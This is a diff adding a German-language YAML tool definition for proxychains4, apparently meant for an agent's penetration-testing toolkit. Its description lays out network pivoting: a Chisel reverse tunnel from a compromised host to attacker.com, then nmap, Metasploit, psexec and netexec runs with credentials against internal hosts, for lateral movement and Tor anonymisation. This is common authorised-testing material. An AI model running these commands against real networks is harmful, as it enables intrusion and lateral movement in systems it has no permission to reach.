@@ -1,0 +1,100 @@
+name: "proxychains"
+command: "proxychains4"
+enabled: true
+short_description: "ProxyChains – Netzwerk-Tools durch SOCKS4/5 oder HTTP-Proxy tunneln"
+description: |
+  ProxyChains leitet TCP-Verbindungen von beliebigen Tools durch einen oder mehrere
+  Proxy-Server (SOCKS4/SOCKS5/HTTP). Ermöglicht die Nutzung von Netzwerk-Tools
+  durch C2-Pivots, SOCKS-Proxies von Chisel/SSH oder Tor.
+
+  **Konfiguration (/etc/proxychains4.conf):**
+  ```ini
+  # Proxy-Typ und Adresse eintragen
+  [ProxyList]
+  socks5 127.0.0.1 1080    # SOCKS5 (Chisel/SSH -D)
+  socks4 127.0.0.1 9050    # Tor
+  http   127.0.0.1 8080    # HTTP-Proxy (Burp)
+
+  # Modus
+  dynamic_chain            # Überspring nicht erreichbare Proxies
+  # strict_chain           # Alle Proxies müssen erreichbar sein
+  # random_chain           # Zufällige Reihenfolge (Anonymisierung)
+  ```
+
+  **Verwendung mit Netzwerk-Tools:**
+  ```bash
+  # Nmap durch SOCKS5 (Chisel oder SSH -D)
+  proxychains nmap -sT -Pn -n 10.10.10.0/24 -p 22,80,443,445,3389
+
+  # Metasploit durch Proxy
+  proxychains msfconsole
+
+  # HTTP-Anfragen durch Proxy
+  proxychains curl http://internal.service/admin
+
+  # SMB-Enumeration durch Pivot
+  proxychains smbmap -H 10.10.10.100 -u admin -p pass
+
+  # Impacket durch Proxy
+  proxychains python3 psexec.py domain/user:pass@10.10.10.100
+
+  # SSH durch SOCKS5
+  proxychains ssh user@10.10.10.100
+
+  # CrackMapExec durch Proxy
+  proxychains netexec smb 10.10.10.0/24 -u admin -p pass
+  ```
+
+  **Kombiniert mit Chisel (typisches Szenario):**
+  ```bash
+  # 1. Chisel-Server auf Angreifer
+  chisel server --port 8080 --reverse
+
+  # 2. Chisel-Client auf kompromittiertem System
+  chisel client attacker.com:8080 R:1080:socks
+
+  # 3. proxychains.conf konfigurieren
+  echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf
+
+  # 4. Tools durch Pivot nutzen
+  proxychains nmap -sT 10.10.10.0/24
+  proxychains netexec smb 10.10.10.0/24 --shares
+  ```
+
+  **Verwendungsszenarien:**
+  - Alle TCP-Tools durch Pivot-SOCKS routen
+  - Netzwerk-Scanning durch kompromittierte Systeme
+  - Lateral Movement in segmentierten Netzen
+  - Anonymisierung via Tor-Chain
+
+  **Hinweise:**
+  - UDP nicht unterstützt (nur TCP)
+  - DNS-Leaks möglich (proxy_dns in config)
+  - Kompatibel mit Chisel, SSH -D, Metasploit socks5
+parameters:
+  - name: "command"
+    type: "string"
+    description: |
+      Auszuführendes Tool mit Argumenten, das durch ProxyChains geleitet wird.
+      Beispiele:
+      - `nmap -sT -Pn 10.10.10.100 -p 22,80,445`
+      - `curl http://internal.host/api`
+      - `smbmap -H 10.10.10.100 -u admin -p pass`
+      - `ssh user@10.10.10.100`
+    required: true
+    position: 0
+    format: "positional"
+  - name: "config"
+    type: "string"
+    description: "Pfad zur ProxyChains-Konfiguration (Standard: /etc/proxychains4.conf)"
+    required: false
+    default: ""
+    flag: "-f"
+    format: "flag"
+  - name: "quiet"
+    type: "bool"
+    description: "Unterdrücke ProxyChains-Output (nur Tool-Output anzeigen)"
+    required: false
+    default: true
+    flag: "-q"
+    format: "flag"
